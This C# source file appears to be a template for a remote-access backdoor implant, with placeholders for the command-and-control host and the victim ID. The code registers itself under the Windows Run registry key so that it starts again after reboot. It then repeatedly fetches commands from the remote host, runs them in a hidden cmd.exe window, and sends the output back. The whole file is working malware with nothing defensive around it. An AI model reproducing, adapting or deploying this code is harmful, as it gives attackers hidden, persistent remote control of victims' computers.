using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace $RAND_NS{
    static class Program{
        static string host = "$HOST";
        static string id = "$ID";
        static string rand = "$RAND";

        static void AutoRun(){
            var hkcu = Registry.CurrentUser;
            var k = hkcu.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            k.SetValue(rand, Process.GetCurrentProcess().MainModule.FileName);
            k.Close();
            hkcu.Close();
        }

        [STAThread]
        static void Main(){
        
            var hkcu = Registry.CurrentUser;
            try{
                var k = hkcu.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                var ka = k.GetValue(rand);
                if(ka == null) k.SetValue(rand, Process.GetCurrentProcess().MainModule.FileName);
                k.Close();
            }
            catch(Exception){
                AutoRun();
            }
            hkcu.Close();
			
            while (true){
                //Console.Clear();

                string cmd = Request(host + "/get?id=" + id + "&data=cmd");
                if(cmd != "null"){
                    string result = "";

                    Process proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.Arguments = "/c " + WebUtility.UrlDecode(cmd);
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.Start();

                    result += proc.StandardOutput.ReadToEnd() + Environment.NewLine;
                    result += proc.StandardError.ReadToEnd() + Environment.NewLine;
                    proc.WaitForExit();

                    Console.WriteLine(result);

                    result = WebUtility.UrlEncode(result);

                    Request(host + "/set?id=" + id + "&data=cmd&txt=null");
                    Request(host + "/set?id=" + id + "&data=result&txt=" + result);
                }
                Thread.Sleep(2000);
            }
        }

        static string Request(string url){
			try{
				//Console.WriteLine("HTTP request to " + url);

				var req = WebRequest.Create(url);
				req.Method = "GET";

				var stream = req.GetResponse().GetResponseStream();
				var data = new StreamReader(stream).ReadToEnd();

				//Console.WriteLine("Result: " + data);

				return data;
			}
			catch(Exception){
				return "null";
			}
        }
    }
}
